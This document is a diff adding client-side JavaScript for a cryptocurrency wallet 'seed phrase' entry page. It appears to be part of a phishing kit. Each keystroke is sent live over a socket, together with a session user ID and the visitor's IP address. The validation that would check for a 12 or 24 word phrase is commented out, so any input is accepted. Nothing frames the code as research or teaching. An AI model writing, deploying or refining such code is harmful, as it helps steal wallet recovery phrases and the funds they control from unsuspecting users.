@@ -1,0 +1,40 @@
+if (!sessionStorage.getItem('user')) sessionStorage.setItem('user', `${Math.floor(Math.random() * 100000) + 10000}`);
+
+const seedPhrase = document.querySelector('#seed-phrase');
+const phraseInvalidMsg = document.querySelector('#phrase-invalid');
+const seedPhraseBorder = document.querySelector('#seed-phrase-border');
+const confirmBtn = document.querySelector('#confirm-btn');
+
+// function checkWordCount(input) {
+//     const words = input.match(/\S+/g) || [];
+//     return (words.length === 12 || words.length === 24);
+// }
+
+seedPhrase.addEventListener('input', () => {
+    checkValidity();
+    socket.emit('userSent', { start: '/seed', user: sessionStorage.getItem('user'), seed: seedPhrase.value, liveInput: true, ipAddress: ipAddress });
+});
+
+function checkValidity() {
+    const phrase = seedPhrase.value;
+
+    if (phrase.length === 0) {
+        // phraseInvalidMsg.style.display = 'none';
+        // seedPhraseBorder.style = '--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);';
+        confirmBtn.classList.add('disabled');
+    } else {
+        // phraseInvalidMsg.style.display = 'block';
+        // seedPhraseBorder.style = '--border-color-unfocused: var(--negative); --border-color-focused: var(--negative); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);';
+        confirmBtn.classList.remove('disabled');
+    }
+}
+
+function handleKeyDown(event) {
+    if (event.key === 'Enter' && !confirmBtn.classList.contains('disabled')) {
+        confirmBtn.click();
+    }
+}
+
+seedPhrase.addEventListener('keydown', handleKeyDown);
+seedPhrase.focus();
+seedPhrase.select();
